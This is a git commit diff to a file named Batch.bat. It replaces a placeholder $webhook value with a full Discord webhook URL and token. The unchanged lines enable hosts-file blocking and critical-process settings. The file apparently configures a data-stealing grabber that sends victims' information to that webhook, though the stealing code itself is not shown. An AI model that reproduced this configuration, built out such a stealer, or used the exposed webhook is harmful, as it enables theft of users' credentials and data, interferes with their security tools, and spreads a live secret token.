b9707b49239566dbc7be8e76483daae202c88df0
iKingOfKings <167252615+iKingOfKings@users.noreply.github.com>
2024-07-08 16:14:33 -0900

    Update Batch.bat

--- Batch.bat
+++ Batch.bat
@@ -1,4 +1,4 @@
-$webhook = "ahhahahah"
+$webhook = "https://canary.discord.com/api/webhooks/1259953049934499900/nJiF07mR7WpYiIrm3YjXNYMBxN8Jspf_q9ZCpTP76CfEC9DKb-vasjQRHDbbV81iwPGC"
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
